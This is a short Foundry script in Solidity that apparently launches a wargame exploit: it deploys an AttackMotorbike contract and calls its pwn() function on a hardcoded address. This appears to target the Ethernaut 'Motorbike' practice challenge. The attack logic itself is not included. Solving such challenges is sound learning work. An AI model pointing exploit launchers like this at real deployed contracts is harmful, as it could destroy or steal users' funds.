// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {AttackMotorbike} from "src/Motorbike/AttackMotorbike.sol";

contract MotorbikeScript is Script {
    function run() public {
        vm.startBroadcast();

        AttackMotorbike attack = new AttackMotorbike();
        attack.pwn(0xc7808eC62EabB3f142e56F4678c2b6CDb1876db4);

        vm.stopBroadcast();
    }
}
